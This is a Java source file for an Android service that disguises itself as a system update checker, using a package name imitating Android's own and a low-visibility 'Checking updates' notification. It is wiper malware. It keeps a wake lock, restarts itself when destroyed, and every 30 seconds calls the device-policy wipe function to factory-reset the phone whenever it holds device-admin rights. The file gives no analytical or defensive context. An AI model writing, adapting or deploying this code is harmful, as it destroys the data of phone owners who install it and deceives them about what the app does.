package com.android.system.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import java.util.Timer;
import java.util.TimerTask;

public class CoreService extends Service {
    private DevicePolicyManager dpm;
    private ComponentName adminComp;
    private PowerManager.WakeLock wakeLock;
    private Timer timer;

    @Override
    public void onCreate() {
        super.onCreate();
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComp = new ComponentName(this, AdminReceiver.class);
        
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sys:wakelock");
        wakeLock.acquire();
        
        startForeground(1, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (dpm.isAdminActive(adminComp)) {
                    dpm.wipeData(0);
                }
            }
        }, 30000, 30000);
        
        return START_STICKY;
    }

    private Notification createNotification() {
        String channelId = "sys_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId, "System Service", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        return new Notification.Builder(this, channelId)
            .setContentTitle("Checking updates")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (timer != null) timer.cancel();
        startService(new Intent(this, CoreService.class));
        super.onDestroy();
    }
}
